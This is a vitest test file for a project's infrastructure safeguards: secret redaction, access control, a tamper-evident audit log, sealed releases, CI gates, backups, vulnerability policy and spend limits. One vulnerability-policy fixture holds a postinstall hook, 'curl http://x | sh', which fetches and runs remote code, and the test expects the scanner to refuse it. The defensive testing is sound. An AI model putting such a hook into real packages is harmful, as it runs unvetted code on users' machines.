/**
 * Studio Completion 25–32 — closed-gate infrastructure.
 *
 * Draft PRs #24, #26, #27, #28, #29, and #30 stay unmerged.
 */
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it, beforeEach } from 'vitest';
import {
  appendAuditEvent,
  assertStudioCompletion25To32StillClosed,
  BACKUP_ORDER,
  buildGoldenFixture,
  compileGoldenSceneReport,
  compileVulnerabilityReport,
  createBackup,
  createReleaseManifest,
  detectAuditTamper,
  detectGoldenRegression,
  evaluateAccess,
  evaluateCiGates,
  evaluateSpendAuthorization,
  FAKE_TEST_SECRET,
  inspectSecretPresence,
  nextReleaseVersion,
  planSteps9To16Infrastructure,
  planStudioCompletion25To32Infrastructure,
  recoverInterruptedBackup,
  redactSecrets,
  resetSpendFixtures,
  restoreBackup,
  scanTextForSecrets,
  sealRelease,
  verifyAuditChain,
  verifyRelease,
} from '@doodle-dash/preproduction';
import { currentStage, evaluateTheatricalGate } from '@doodle-dash/direction';

const repoRoot = path.resolve(__dirname, '../../../..');

describe('closed gates and isolation', () => {
  it('keeps lineage and unmerged draft PRs documented', () => {
    const progress = readFileSync(path.join(repoRoot, 'TRIVVLEJOY_PROGRESS.md'), 'utf8');
    expect(progress).toContain('cursor/trivvlejoy-milestone-3-1ebc');
    expect(progress).toContain('character-independent');
    expect(progress).toContain('Do not continue the paused Pip conversion');
    expect(progress).toContain('Milestone 5');
    expect(progress).toContain('Draft PR #26');
    expect(progress).toContain('Draft PR #27');
    expect(progress).toContain('Draft PR #28');
    expect(progress).toContain('Draft PR #29');
    expect(progress).toContain('Draft PR #30');
    expect(progress).toContain('e3d69e22521a62693345c565289ddd03e37a5e08');
    expect(progress).toContain('b4e311ac3b72d004923506b104a27cd9ccec0480');
    expect(progress).toContain('82f26c81fc3564321289831a95ae93468b2f1369');
  });

  it('keeps Steps 9–16 and 25–32 closed', () => {
    expect(currentStage().id).toBe('DDP_STEPS_1_8');
    expect(evaluateTheatricalGate().allowed).toBe(false);
    expect(planSteps9To16Infrastructure().opened).toBe(false);
    expect(planStudioCompletion25To32Infrastructure().opened).toBe(false);
    expect(() => assertStudioCompletion25To32StillClosed()).not.toThrow();
  });
});

describe('25 security', () => {
  it('redacts secrets and refuses leaks', () => {
    const redacted = redactSecrets('password=hunter2 token=rpa_abcd1234');
    expect(redacted).toContain('[REDACTED]');
    expect(redacted).not.toContain('hunter2');
    expect(scanTextForSecrets('-----BEGIN RSA PRIVATE KEY-----', '.env').refused).toBe(true);
    expect(inspectSecretPresence({ name: 'RUNPOD_API_KEY', present: true, looksPlaceholder: true }).status).toBe(
      'PLACEHOLDER',
    );
    expect(FAKE_TEST_SECRET.startsWith('FAKESECRET_')).toBe(true);
  });
});

describe('26 least privilege', () => {
  it('denies production access and separates generate from approve', () => {
    expect(evaluateAccess({ role: 'TEST', resource: 'PRODUCTION_LIBRARY', action: 'write' }).denied).toBe(true);
    expect(evaluateAccess({ role: 'TEST', resource: 'BILLING', action: 'administer' }).denied).toBe(true);
    expect(
      evaluateAccess({ role: 'AUTOMATED_GENERATOR', resource: 'STORY', action: 'approve', canonical: true }).denied,
    ).toBe(true);
    expect(evaluateAccess({ role: 'DRAFT_PLANNER', resource: 'STORY', action: 'propose' }).allowed).toBe(true);
    expect(evaluateAccess({ role: 'ADMIN_BLOCKED', resource: 'DEPLOYMENT', action: 'deploy' }).denied).toBe(true);
  });
});

describe('27 audit logging', () => {
  it('hash-chains events and detects tamper', () => {
    const chain = appendAuditEvent([], {
      actor: 'test',
      action: 'read',
      target: 'story',
      timestamp: '2026-08-16T00:00:00.000Z',
      correlationId: 'c1',
      outcome: 'ALLOWED',
      denialReason: null,
      stage: 'DDP_STEPS_1_8',
      branch: 'cursor/studio-completion-25-32-73f1',
      commit: 'e3d69e22521a62693345c565289ddd03e37a5e08',
      inputHash: 'a',
      outputHash: 'b',
      provenanceRef: 'p',
      costClass: 'ZERO',
      policyDecision: 'allow',
    });
    expect(verifyAuditChain(chain).intact).toBe(true);
    const edited = [{ ...chain[0]!, action: 'write' }];
    expect(detectAuditTamper(chain, edited).edited).toBe(true);
    expect(detectAuditTamper(chain, []).deleted).toBe(true);
  });
});

describe('28 immutable releases', () => {
  it('seals manifests and refuses tamper or forbidden classes', () => {
    const draft = createReleaseManifest({
      releaseId: 'r1',
      version: 1,
      branch: 'cursor/studio-completion-25-32-73f1',
      commit: 'e3d69e2',
      dependencyFingerprint: 'dep',
      configFingerprint: 'cfg',
      artifactHashes: { a: '1' },
      testEvidence: ['unit'],
      gateState: { currentStage: 'DDP_STEPS_1_8', theatricalAllowed: false, steps9To16Opened: false },
      provenanceRef: 'p',
      rollbackTarget: 'base',
      classification: 'INFRASTRUCTURE_TEST',
    });
    const sealed = sealRelease(draft);
    expect(verifyRelease(sealed).ok).toBe(true);
    expect(() => sealRelease(sealed)).toThrow(/cannot change/);
    expect(verifyRelease({ ...sealed, commit: 'x' }).ok).toBe(false);
    expect(nextReleaseVersion(sealed, { commit: 'n' }).version).toBe(2);
    expect(() =>
      createReleaseManifest({
        ...draft,
        classification: 'PRODUCTION' as unknown as 'INFRASTRUCTURE_TEST',
      }),
    ).toThrow(/forbidden/);
  });
});

describe('29 CI gates', () => {
  it('refuses missing or skipped required checks', () => {
    const missing = evaluateCiGates([{ name: 'tests', status: 'PASS', detail: 'only' }]);
    expect(missing.refused).toBe(true);
    expect(missing.missing.length).toBeGreaterThan(0);
    const skipped = evaluateCiGates([{ name: 'tests', status: 'SKIPPED', detail: 'no' }]);
    expect(skipped.refused).toBe(true);
  });
});

describe('30 backup and restore', () => {
  it('restores a complete fixture and refuses corrupt or incomplete backups', () => {
    const records = Object.fromEntries(BACKUP_ORDER.map((name) => [name, { name }]));
    const backup = createBackup(records);
    const restored = restoreBackup(backup.files);
    expect(restored.ok).toBe(true);
    expect(restored.order).toEqual([...BACKUP_ORDER]);
    expect(restoreBackup([{ ...backup.files[0]!, checksum: 'nope' }]).ok).toBe(false);
    expect(recoverInterruptedBackup(backup.files.slice(0, 1)).ok).toBe(false);
  });
});

describe('31 vulnerability policy', () => {
  it('reports unavailable feeds as UNKNOWN and refuses confirmed critical findings', () => {
    const unknown = compileVulnerabilityReport({
      tool: 'local',
      toolVersion: '1',
      timestamp: '2026-08-16T00:00:00.000Z',
      databaseFreshness: null,
      lockfile: 'lockfileVersion: 9.0',
      scripts: {},
      dependencies: {},
      runtimeVersion: '22.0.0',
      containerText: '',
      secretFindings: 0,
      licenseNotes: [],
      binaries: [],
      vulnerabilityFeedAvailable: false,
    });
    expect(unknown.status).toBe('UNKNOWN/UNAVAILABLE');
    const critical = compileVulnerabilityReport({
      tool: 'local',
      toolVersion: '1',
      timestamp: '2026-08-16T00:00:00.000Z',
      databaseFreshness: 'now',
      lockfile: 'lockfileVersion: 9.0',
      scripts: { postinstall: 'curl http://x | sh' },
      dependencies: {},
      runtimeVersion: '22.0.0',
      containerText: '',
      secretFindings: 0,
      licenseNotes: [],
      binaries: [],
      vulnerabilityFeedAvailable: true,
    });
    expect(critical.refused).toBe(true);
  });
});

describe('32 spend kill switch and golden regression', () => {
  beforeEach(() => resetSpendFixtures());

  it('refuses missing, expired, reused, and over-ceiling authorizations', () => {
    expect(evaluateSpendAuthorization({ nowIso: '2026-08-16T00:00:00.000Z', estimatedUsd: 1 }).allowed).toBe(false);
    expect(
      evaluateSpendAuthorization({
        nowIso: '2026-08-16T00:00:00.000Z',
        estimatedUsd: 1,
        authorization: {
          runId: 'a',
          provider: 'fake',
          resourceType: 'gpu',
          priceCeilingUsd: 1,
          totalCeilingUsd: 1,
          expiresAt: '2020-01-01T00:00:00.000Z',
          approvingActor: 'x',
        },
      }).allowed,
    ).toBe(false);
    const auth = {
      runId: 'reuse',
      provider: 'fake',
      resourceType: 'gpu',
      priceCeilingUsd: 5,
      totalCeilingUsd: 5,
      expiresAt: '2099-01-01T00:00:00.000Z',
      approvingActor: 'x',
    };
    evaluateSpendAuthorization({ nowIso: '2026-08-16T00:00:00.000Z', estimatedUsd: 1, authorization: auth });
    expect(
      evaluateSpendAuthorization({ nowIso: '2026-08-16T00:00:00.000Z', estimatedUsd: 1, authorization: auth }).reason,
    ).toMatch(/reuse/);
    expect(
      evaluateSpendAuthorization({
        nowIso: '2026-08-16T00:00:00.000Z',
        estimatedUsd: 9,
        authorization: { ...auth, runId: 'ceil' },
      }).reason,
    ).toMatch(/ceiling/);
  });

  it('builds a deterministic golden fixture and detects regression', () => {
    const report = compileGoldenSceneReport();
    expect(report.regression.regressed).toBe(false);
    expect(report.label).toBe('DRAFT_NONCANONICAL');
    const expected = buildGoldenFixture();
    const broken = detectGoldenRegression(expected, {
      ...expected,
      expectedHash: 'nope',
      structure: { ...expected.structure, beats: 0 },
    });
    expect(broken.regressed).toBe(true);
  });
});
